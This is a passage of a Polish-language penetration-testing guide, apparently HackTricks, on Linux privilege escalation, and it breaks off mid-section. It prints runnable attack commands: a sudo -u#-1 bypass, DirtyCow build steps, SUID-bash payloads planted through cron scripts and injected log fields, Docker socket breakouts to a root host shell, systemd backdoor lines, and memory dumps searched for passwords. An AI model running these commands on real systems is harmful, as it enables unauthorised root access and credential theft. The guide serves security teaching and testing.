# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacje o systemie

### Informacje o OS

Zacznijmy zdobywać informacje o działającym OS
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

Jeśli **masz uprawnienia zapisu do dowolnego katalogu w zmiennej `PATH`** możesz być w stanie przejąć niektóre biblioteki lub binaria:
```bash
echo $PATH
```
### Informacje o środowisku

Czy w zmiennych środowiskowych znajdują się interesujące informacje, hasła lub klucze API?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Sprawdź wersję jądra i czy istnieje jakiś exploit, który można użyć do escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych jąder i kilka już dostępnych **compiled exploits** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Inne strony, gdzie możesz znaleźć kilka **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje jądra z tej strony możesz wykonać:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu kernel exploits to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (uruchomić IN victim, tylko sprawdza exploits dla kernel 2.x)

Zawsze **wyszukaj wersję jądra w Google**, być może Twoja wersja jądra jest wymieniona w jakimś kernel exploit i wtedy będziesz pewien, że exploit jest prawidłowy.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Wersja sudo

Na podstawie podatnych wersji sudo, które występują w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając poniższego polecenia grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: weryfikacja podpisu nie powiodła się

Sprawdź **smasher2 box of HTB** jako **przykład**, jak ta vuln może być wykorzystana
```bash
dmesg 2>/dev/null | grep "signature"
```
### Więcej enumeracji systemu
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wymień możliwe środki obrony

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Jeśli jesteś wewnątrz docker container, możesz spróbować się z niego wydostać:


{{#ref}}
docker-security/
{{#endref}}

## Dyski

Sprawdź **co jest zamontowane i odmontowane**, gdzie i dlaczego. Jeśli coś jest odmontowane, możesz spróbować to zamontować i sprawdzić, czy nie ma tam prywatnych informacji.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wymień przydatne binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź też, czy **any compiler is installed**. Jest to przydatne, jeśli musisz użyć jakiegoś kernel exploit, ponieważ zaleca się skompilować go na maszynie, na której będziesz go używać (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane podatne oprogramowanie

Sprawdź **wersję zainstalowanych pakietów i usług**. Może istnieć jakaś stara wersja Nagios (na przykład), która mogłaby zostać wykorzystana do escalating privileges…\
Zaleca się ręczne sprawdzenie wersji bardziej podejrzanych zainstalowanych programów.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Zauważ, że te polecenia pokażą dużo informacji, które w większości będą bezużyteczne; dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy którakolwiek z zainstalowanych wersji oprogramowania jest podatna na znane exploits_

## Procesy

Sprawdź, **jakie procesy** są uruchomione i zweryfikuj, czy któryś proces nie ma **więcej uprawnień niż powinien** (może tomcat uruchomiony przez root?)
```bash
ps aux
ps -ef
top -n 1
```
Zawsze sprawdzaj, czy nie działają [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je poprzez sprawdzenie parametru `--inspect` w linii poleceń procesu.\
Sprawdź też **swoje uprawnienia do binarek procesów**, może uda ci się którąś nadpisać.

### Monitorowanie procesów

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. To może być bardzo przydatne do identyfikacji podatnych procesów uruchamianych często lub gdy spełnione są określone warunki.

### Pamięć procesu

Niektóre usługi na serwerze zapisują **credentials in clear text inside the memory**.\
Zwykle potrzebujesz **uprawnień root** aby odczytać pamięć procesów należących do innych użytkowników, dlatego jest to zazwyczaj bardziej przydatne, gdy jesteś już root i chcesz odnaleźć dodatkowe credentials.\
Pamiętaj jednak, że **jako zwykły użytkownik możesz czytać pamięć procesów, które należą do Ciebie**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skrypt GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Dla danego PID, **maps pokazuje, jak pamięć jest zmapowana w wirtualnej przestrzeni adresowej tego procesu**; pokazuje też **uprawnienia każdego zmapowanego regionu**. Pseudo-plikiem **mem** udostępniana jest sama pamięć procesu. Z pliku **maps** wiemy, które **regiony pamięci są czytelne** i ich offsety. Wykorzystujemy te informacje, aby przemieścić się w pliku **mem** i zrzucić wszystkie czytelne regiony do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do systemowej **pamięci fizycznej**, a nie pamięci wirtualnej. Do wirtualnej przestrzeni adresowej jądra można uzyskać dostęp za pomocą /dev/kmem.\
Zazwyczaj `/dev/mem` jest czytelny tylko dla **root** i grupy **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump dla linux

ProcDump to implementacja dla linux klasycznego narzędzia ProcDump z pakietu Sysinternals dla Windows. Pobierz ją z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Aby zrzucić pamięć procesu, możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania dotyczące root i zrzucić proces należący do Ciebie
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany jest root)

### Dane uwierzytelniające z pamięci procesu

#### Ręczny przykład

Jeśli zauważysz, że proces authenticator jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz dump the process (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby dump the memory of a process) i przeszukać credentials wewnątrz memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) będzie **wykradać poświadczenia w postaci jawnego tekstu z pamięci** i z niektórych **dobrze znanych plików**. Wymaga uprawnień roota, aby działać poprawnie.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| Hasło GDM (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Wyszukiwanie Regexów/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zaplanowane zadania/Cron

Sprawdź, czy któreś zaplanowane zadanie jest podatne. Być może możesz wykorzystać skrypt uruchamiany przez root (wildcard vuln? możesz modyfikować pliki, których używa root? użyć symlinks? utworzyć konkretne pliki w katalogu, którego używa root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Na przykład, wewnątrz _/etc/crontab_ możesz znaleźć PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zwróć uwagę, że użytkownik "user" ma uprawnienia zapisu do /home/user_)

Jeśli wewnątrz tego crontab root próbuje wykonać jakąś komendę lub skrypt bez ustawienia PATH. Na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać root shell używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Jeśli skrypt uruchamiany przez root ma “**\***” w poleceniu, można to wykorzystać, by wywołać nieoczekiwane zachowania (np. privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli wildcard jest poprzedzony ścieżką, taką jak** _**/some/path/\***_ **, nie jest podatny (nawet** _**./\***_ **nie jest).**

Przeczytaj następną stronę, aby poznać więcej trików dotyczących wykorzystywania wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. Jeśli cron/parser uruchamiany jako root czyta niezaufane pola logów i przekazuje je do kontekstu arytmetycznego, atakujący może wstrzyknąć command substitution $(...) które wykona się jako root, gdy cron zostanie uruchomiony.

- Dlaczego to działa: W Bash rozszerzenia zachodzą w tej kolejności: parameter/variable expansion, command substitution, arithmetic expansion, a następnie word splitting i pathname expansion. Dlatego wartość taka jak `$(/bin/bash -c 'id > /tmp/pwn')0` zostanie najpierw podmieniona (uruchamiając polecenie), a potem pozostała część numeryczna `0` jest użyta do obliczeń arytmetycznych, więc skrypt kontynuuje bez błędów.

- Typowy podatny wzorzec:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Eksploatacja: Spowoduj zapis do analizowanego logu tekstu kontrolowanego przez atakującego tak, aby pole wyglądające na liczbę zawierało command substitution i kończyło się cyfrą. Upewnij się, że twoje polecenie nie wypisuje nic na stdout (lub przekieruj jego wyjście), aby arytmetyka pozostała poprawna.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli script uruchamiany przez root korzysta z **katalogu, do którego masz pełny dostęp**, może być użyteczne usunięcie tego folderu i **utworzenie symlink wskazującego na inny**, który będzie serwował script kontrolowany przez ciebie.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Częste zadania cron

Możesz monitorować procesy, aby odnaleźć te, które są wykonywane co 1, 2 lub 5 minut. Być może możesz to wykorzystać do eskalacji uprawnień.

Na przykład, aby **monitorować co 0.1s przez 1 minutę**, **sortować według najmniej wykonywanych poleceń** i usuwać polecenia, które były wykonywane najczęściej, możesz zrobić:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz także użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (to będzie monitorować i wyświetlać każdy uruchamiany proces).

### Niewidoczne cron jobs

Możliwe jest utworzenie cronjob przez **wstawienie carriage return po komentarzu** (bez znaku nowej linii), a cron job będzie działać. Przykład (zwróć uwagę na znak carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Usługi

### Zapisywalne _.service_ pliki

Sprawdź, czy możesz zapisać dowolny plik `.service`. Jeśli tak, możesz go **zmodyfikować**, tak aby **uruchamiał** Twój **backdoor** gdy usługa zostanie **uruchomiona**, **zrestartowana** lub **zatrzymana** (może być konieczny reboot maszyny).\
Na przykład umieść backdoor w pliku .service używając **`ExecStart=/tmp/script.sh`**

### Zapisywalne binaria usług

Miej na uwadze, że jeśli masz **uprawnienia zapisu do binariów uruchamianych przez usługi**, możesz je zmodyfikować na backdoor, dzięki czemu po ponownym uruchomieniu usług backdoor zostanie wykonany.

### systemd PATH - Ścieżki względne

Możesz zobaczyć PATH używany przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli odkryjesz, że możesz **zapisywać** w którymkolwiek z folderów na tej ścieżce, możesz być w stanie **eskalować uprawnienia**. Musisz wyszukać **używanie ścieżek względnych w plikach konfiguracji usług** takich jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie utwórz **plik wykonywalny** o **tej samej nazwie co plik binarny z relatywnej ścieżki** wewnątrz folderu PATH używanego przez systemd, do którego możesz zapisać, a gdy serwis zostanie poproszony o wykonanie podatnej akcji (**Start**, **Stop**, **Reload**), twój **backdoor zostanie uruchomiony** (użytkownicy bez uprawnień zwykle nie mogą uruchamiać/zatrzymywać serwisów, ale sprawdź, czy możesz użyć `sudo -l`).

**Dowiedz się więcej o usługach za pomocą `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd, których nazwa kończy się na `**.timer**` i które kontrolują pliki lub zdarzenia `**.service**`. **Timery** mogą być używane jako alternatywa dla cron, ponieważ mają wbudowane wsparcie dla zdarzeń opartych na czasie kalendarzowym i zdarzeń monotonicznych oraz mogą być uruchamiane asynchronicznie.

Możesz wylistować wszystkie timery za pomocą:
```bash
systemctl list-timers --all
```
### Zapisywalne timery

Jeśli możesz zmodyfikować timer, możesz sprawić, że wykona on niektóre istniejące jednostki systemd.unit (np. `.service` lub `.target`).
```bash
Unit=backdoor.service
```
W dokumentacji można przeczytać, co to jest Unit:

> Jednostka, która zostanie aktywowana, gdy ten timer wygaśnie. Argument to nazwa jednostki, której sufiks nie jest ".timer". Jeśli nie zostanie podana, ta wartość domyślnie wskazuje na service o takiej samej nazwie jak jednostka timera, z wyjątkiem sufiksu. (Patrz wyżej.) Zaleca się, aby nazwa jednostki, która jest aktywowana, i nazwa jednostki timera były identyczne, z wyjątkiem sufiksu.

W związku z tym, aby nadużyć tego uprawnienia, musiałbyś:

- Znaleźć jakąś jednostkę systemd (np. `.service`), która **uruchamia binarkę, do której można zapisywać**
- Znaleźć jednostkę systemd, która **uruchamia względną ścieżkę** i masz **uprawnienia do zapisu** w **systemd PATH** (aby podszyć się pod ten wykonywalny plik)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień root i musisz wykonać:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) umożliwiają **komunikację procesów** na tej samej lub różnych maszynach w modelach klient-serwer. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji między komputerami i są konfigurowane za pomocą plików `.socket`.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje różnią się między sobą, ale w skrócie **wskazują, gdzie ma nasłuchiwać** socket (ścieżka pliku gniazda AF_UNIX, adres IPv4/6 i/lub numer portu do nasłuchiwania itp.)
- `Accept`: Przyjmuje argument boolean. Jeśli **true**, dla każdego przychodzącego połączenia **uruchamiany jest egzemplarz usługi** i przekazywany jest do niego tylko gniazdko połączenia. Jeśli **false**, wszystkie gniazdka nasłuchujące są **przekazywane do uruchomionej jednostki service**, i tylko jedna jednostka service jest uruchamiana dla wszystkich połączeń. Ta wartość jest ignorowana dla gniazdek datagramowych i FIFO, gdzie pojedyncza jednostka service bezwarunkowo obsługuje cały przychodzący ruch. **Defaults to false**. Ze względu na wydajność zaleca się pisać nowe daemony w sposób zgodny z `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują jedną lub więcej linii poleceń, które są **wykonywane przed** lub **po** utworzeniu i powiązaniu nasłuchujących **socketów**/FIFO, odpowiednio. Pierwszy token linii poleceń musi być absolutną nazwą pliku, a następnie argumenty dla procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po** zamknięciu i usunięciu nasłuchujących **socketów**/FIFO, odpowiednio.
- `Service`: Określa nazwę jednostki **service**, którą należy **aktywować** przy **przychodzącym ruchu**. To ustawienie jest dozwolone tylko dla socketów z Accept=no. Domyślnie wskazuje na service o tej samej nazwie, co socket (z odpowiednią zamianą sufiksu). W większości przypadków nie powinno być konieczne używanie tej opcji.

### Writable .socket files

Jeśli znajdziesz **zapisywalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś w stylu: `ExecStartPre=/home/kali/sys/backdoor` i backdoor zostanie wykonany przed utworzeniem socketu. W związku z tym **prawdopodobnie będziesz musiał poczekać na reboot maszyny.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

Jeśli **zidentyfikujesz dowolny zapisywalny socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), to **możesz komunikować się** z tym socketem i być może wykorzystać jakąś lukę.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład eksploatacji:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Zauważ, że mogą istnieć pewne **sockets nasłuchujące żądań HTTP** (_Nie mam na myśli plików .socket, tylko pliki działające jako unix sockets_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Jeśli socket **odpowiada na żądanie HTTP**, możesz **komunikować się** z nim i być może **exploit some vulnerability**.

### Docker socket z prawami zapisu

Docker socket, często znajdujący się pod `/var/run/docker.sock`, to krytyczny plik, który powinien być zabezpieczony. Domyślnie jest zapisywalny przez użytkownika `root` i członków grupy `docker`. Posiadanie write access do tego socketu może prowadzić do Privilege Escalation. Poniżej znajdziesz opis, jak można to osiągnąć oraz alternatywne metody, jeśli Docker CLI nie jest dostępne.

#### **Privilege Escalation with Docker CLI**

Jeśli masz write access do Docker socket, możesz escalate privileges używając następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia umożliwiają uruchomienie kontenera z dostępem root do systemu plików hosta.

#### **Używanie Docker API bezpośrednio**

W sytuacjach, gdy Docker CLI nie jest dostępne, Docker socket można nadal obsługiwać przy użyciu Docker API i poleceń `curl`.

1.  **List Docker Images:** Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Wyślij żądanie utworzenia kontenera, który zamontuje katalog root systemu hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Użyj `socat`, aby nawiązać połączenie z kontenerem, umożliwiając wykonywanie poleceń w jego wnętrzu.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po skonfigurowaniu połączenia `socat` możesz wykonywać polecenia bezpośrednio w kontenerze z dostępem root do systemu plików hosta.

### Inne

Zwróć uwagę, że jeśli masz uprawnienia zapisu do docker socket, ponieważ jesteś **w grupie `docker`**, masz [**więcej sposobów na eskalację uprawnień**](interesting-groups-linux-pe/index.html#docker-group). Jeśli [**docker API nasłuchuje na porcie** możesz też być w stanie je skompromitować](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **więcej sposobów na wydostanie się z docker lub jego wykorzystanie do eskalacji uprawnień** w:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany system komunikacji międzyprocesowej (IPC), który umożliwia aplikacjom efektywną wzajemną interakcję i wymianę danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidne ramy dla różnych form komunikacji aplikacji.

System jest wszechstronny — obsługuje podstawowe IPC, które usprawnia wymianę danych między procesami, przypominając rozszerzone UNIX domain sockets. Ponadto wspiera wysyłanie zdarzeń lub sygnałów, ułatwiając bezproblemową integrację komponentów systemowych. Na przykład sygnał z demona Bluetooth o nadchodzącym połączeniu może nakazać odtwarzaczowi muzyki wyciszenie dźwięku, poprawiając doświadczenie użytkownika. Dodatkowo D-Bus obsługuje system zdalnych obiektów, upraszczając żądania usług i wywołania metod między aplikacjami, co usprawnia procesy tradycyjnie skomplikowane.

D-Bus działa w modelu allow/deny, zarządzając uprawnieniami do wiadomości (wywołań metod, emisji sygnałów itp.) na podstawie skumulowanego działania pasujących reguł polityki. Polityki te określają interakcje z busy, co potencjalnie może prowadzić do eskalacji uprawnień przez wykorzystanie tych uprawnień.

Przykład takiej polityki w `/etc/dbus-1/system.d/wpa_supplicant.conf` jest podany, określając uprawnienia dla użytkownika root do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy mają zastosowanie uniwersalnie, podczas gdy polityki w kontekście "default" dotyczą wszystkich nieobjętych innymi, bardziej szczegółowymi politykami.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się, jak enumerate i exploit komunikację D-Bus tutaj:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Zawsze warto enumerate sieć, aby określić położenie maszyny.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otwwarte porty

Zawsze sprawdzaj usługi sieciowe działające na maszynie, z którymi nie mogłeś wejść w interakcję przed uzyskaniem dostępu:
```bash
